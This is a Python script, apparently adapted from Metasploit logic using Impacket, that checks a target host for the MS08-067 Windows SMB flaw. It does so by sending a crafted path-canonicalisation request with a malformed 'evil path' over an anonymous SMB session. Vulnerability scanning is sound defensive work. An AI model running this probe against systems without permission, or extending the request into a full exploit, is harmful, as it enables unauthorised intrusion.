#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MS08-067 Vulnerability Detector - Dynamic Server Name Edition
Based on Metasploit detection logic and Impacket implementation
Usage: python ms08_067_check.py <target_ip>
"""

import sys
import struct
from typing import Optional, Any
from impacket import smbconnection
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.uuid import uuidtup_to_bin
from lib.rex import RexNDR, RexText

def build_evil_path() -> bytes:
    """Construct malicious path for vulnerability detection"""
    path: bytes = b""
    path += b"\x00\\\x00/" * 16
    path += RexText.to_unicode("\\")
    path += RexText.to_unicode("R7")
    path += RexText.to_unicode("\\")
    path += RexText.to_unicode("..")
    path += RexText.to_unicode("\\")
    path += RexText.to_unicode("..")
    path += RexText.to_unicode("\\")
    path += RexText.to_unicode("R7")
    path += b"\x00\x00"
    return path


def detect_ms08_067(ip: str, pipe: str = 'browser') -> bool:
    """Detect MS08-067 vulnerability on target host"""
    smb_conn: Optional[smbconnection.SMBConnection] = None
    dce: Optional[Any] = None
    err_code: int = 0
    
    try:
        print(f"[*] Target: {ip}:445 | Starting scan")
        smb_conn = smbconnection.SMBConnection(ip, ip, sess_port=445)
        smb_conn.login('', '')
        print(f"[+] SMB connected | Target: {ip}")
        
        trans_str: str = f"ncacn_np:{ip}[\\pipe\\{pipe}]"
        trans: Any = transport.DCERPCTransportFactory(trans_str)
        trans.set_smb_connection(smb_conn)
        
        print("[*] Creating DCERPC handle")
        dce = trans.get_dce_rpc()
        dce.connect()
        
        uuid: str = '4b324fc8-1670-01d3-1278-5a47bf6ee188'
        ver: str = '3.0'
        dce.bind(uuidtup_to_bin((uuid, ver)))
        print(f"[+] DCERPC bound | Target: {ip}")
        
        server_name: str = RexText.rand_text_alpha(8)
        print(f"[*] Server name: {server_name}")
        
        path: bytes = build_evil_path()
        print(f"[*] Build evil path...")
        print(f"[*] Path length: {len(path)} bytes")
        print(f"[*] Path content:\n{RexText.hex_dump(path)}")

        print("[*] Building exploit request...")
        request_stub = RexNDR.uwstring(server_name)
        request_stub += RexNDR.unicode_conformant_varying_string_prebuilt(path)
        request_stub += RexNDR.long(8)
        request_stub += RexNDR.wstring("\\")
        request_stub += RexNDR.long(4097)
        request_stub += RexNDR.long(0)
        print(f"[*] Request length: {len(request_stub)} bytes")
        print(f"[*] Request content:\n{RexText.hex_dump(request_stub)}")
        
        print("[*] Sending DCERPC call")
        try:
            dce.call(0x1f, request_stub)
            res: bytes = dce.recv()
            print(f"[+] Response | Len: {len(res)} bytes")
            
            print(f"[*] Response:\n{RexText.hex_dump(res)}")
            
            if len(res) >= 8:
                err_code = struct.unpack("<I", res[4:8])[0]
                print(f"[*] Error code: 0x{err_code:08x}")
            else:
                err_code = 0
                print("[-] Short response")
                
        except DCERPCException as e:
            err_msg: str = str(e)
            print(f"[-] Call failed: {e.__class__.__name__}")
            
            if "0x0052005c" in err_msg:
                err_code = 0x0052005c
                print(f"[*] Error code: 0x{err_code:08x}")
            else:
                err_code = 0
                
    except smbconnection.SessionError as e:
        print(f"[-] SMB error: {e}")
        return False
    except Exception as e:
        print(f"[-] Exception: {e}")
        return False
    finally:
        try:
            if dce:
                dce.disconnect()
            if smb_conn:
                smb_conn.logoff()
        except Exception:
            pass

    if err_code == 0x0052005c:
        print(f"[!] Vulnerability found | Code: 0x{err_code:08x}")
        print("[!] Target vulnerable to MS08-067")
        return True
    else:
        print(f"[-] No vulnerability | Code: 0x{err_code:08x}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python ms08_067_check.py <target_ip>")
        sys.exit(1)
    
    ip: str = sys.argv[1]
    print(f"[*] Target: {ip}")
    
    vulnerable: bool = detect_ms08_067(ip)
    
    if vulnerable:
        print("\n[!] CRITICAL: Vulnerable to MS08-067")
        print("[!] Apply patches or disable SMBv1")
    else:
        print("\n[+] SECURE: Not vulnerable")
    
    print("[*] Scan done")
